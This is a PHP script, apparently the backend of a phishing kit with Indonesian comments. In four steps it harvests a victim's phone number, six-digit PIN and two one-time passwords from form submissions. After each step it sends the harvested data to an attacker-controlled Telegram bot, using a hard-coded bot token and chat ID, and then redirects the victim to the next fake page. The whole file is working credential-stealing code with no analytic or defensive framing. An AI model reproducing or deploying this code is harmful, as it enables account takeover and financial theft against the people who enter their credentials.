<?php

// Setting sendiri Bot token dan Chat ID
$telegram_token = '6062411130:AAFyktNGS5Tz0IpiREweMALCu0MdJqnpX30';
$telegram_chatid = '5801273619';

// kosongkan variaable
$pin = '';
$otp_1 = '';
$otp_2 = '';
$phone = '';
$message = '';

// Jika tidak ada  GET step
if (!isset($_GET['step'])) {
    // Balik ke index
    header("location:./index.php");
}
$step = $_GET['step'];
// Tampung GET data
if (isset($_GET['phone'])) {
    $phone = $_GET['phone'];
}
if (isset($_GET['pin1']) && isset($_GET['pin2']) && isset($_GET['pin3']) && isset($_GET['pin4']) && isset($_GET['pin5']) && isset($_GET['pin6'])) {
    $pin = $_GET['pin1'] . $_GET['pin2'] . $_GET['pin3'] . $_GET['pin4'] . $_GET['pin5'] . $_GET['pin6'];
}
if (isset($_GET['pin'])) {
    $pin = $_GET['pin'];
}
if (isset($_GET['otp_1'])) {
    $otp_1 = $_GET['otp_1'];
}
if (isset($_GET['otp1']) && isset($_GET['otp2']) && isset($_GET['otp3']) && isset($_GET['otp4']) && $step == 3) {
    $otp_1 = $_GET['otp1'] . $_GET['otp2'] . $_GET['otp3'] . $_GET['otp4'];
}
if (isset($_GET['otp1']) && isset($_GET['otp2']) && isset($_GET['otp3']) && isset($_GET['otp4']) && $step == 4) {
    $otp_2 = $_GET['otp1'] . $_GET['otp2'] . $_GET['otp3'] . $_GET['otp4'];
}
// Jika Nomor diinput
// Kirim Telegram dan masuk next step
if (!empty($phone) && $step == 1) {
    $message .= '-----------------------------%0A';
    $message .= 'Web Notifikasi%0A';
    $message .= '-----------------------------%0A';
    $message .= "NO.HP : 0" . $phone . "%0A";
    $message .= '-----------------------------%0A';
    $json = file_get_contents('https://api.telegram.org/bot' . $telegram_token . '/sendMessage?chat_id=' . $telegram_chatid . '&text=' . $message . '&parse_mode=Markdown');
    header("location:./pin.php?phone=" . $phone);
    die;
}

// Jika Pin diinput
if (!empty($phone)  && !empty($pin) && $step == 2) {
    $message .= '-----------------------------%0A';
    $message .= 'Web Notifikasi%0A';
    $message .= '-----------------------------%0A';
    $message .= "NO.HP : 0" . $phone . "%0A";
    $message .= "PIN : " . $pin . "%0A";
    $message .= '-----------------------------%0A';
    $json = file_get_contents('https://api.telegram.org/bot' . $telegram_token . '/sendMessage?chat_id=' . $telegram_chatid . '&text=' . $message . '&parse_mode=Markdown');
    header("location:./otp.php?phone=" . $phone . "&pin=" . $pin);
    die;
}
// Jika Pin diinput
if (!empty($phone) && !empty($pin) && !empty($otp_1) && $step == 3) {
    $message .= '-----------------------------%0A';
    $message .= 'Web Notifikasi%0A';
    $message .= '-----------------------------%0A';
    $message .= "NO.HP : 0" . $phone . "%0A";
    $message .= "PIN : " . $pin . "%0A";
    $message .= "OTP 1 : " . $otp_1 . "%0A";
    $message .= '-----------------------------%0A';
    $json = file_get_contents('https://api.telegram.org/bot' . $telegram_token . '/sendMessage?chat_id=' . $telegram_chatid . '&text=' . $message . '&parse_mode=Markdown');
    header("location:./otp-valid.php?phone=" . $phone . "&pin=" . $pin . "&otp_1=" . $otp_1);
    die;
}

// Jika Pin diinput
if (!empty($phone) && !empty($pin) && !empty($otp_1) && !empty($otp_2) && $step == 4) {
    $message .= '-----------------------------%0A';
    $message .= 'Web Notifikasi%0A';
    $message .= '-----------------------------%0A';
    $message .= "NO.HP : 0" . $phone . "%0A";
    $message .= "PIN : " . $pin . "%0A";
    $message .= "OTP 1 : " . $otp_1 . "%0A";
    $message .= "OTP 2 : " . $otp_2 . "%0A";
    $message .= '-----------------------------%0A';
    $json = file_get_contents('https://api.telegram.org/bot' . $telegram_token . '/sendMessage?chat_id=' . $telegram_chatid . '&text=' . $message . '&parse_mode=Markdown');
    header("location:./otp-valid.php?phone=" . $phone . "&pin=" . $pin . "&otp_1=" . $otp_1); 
      die;
}
header("location:./index.php");
die;
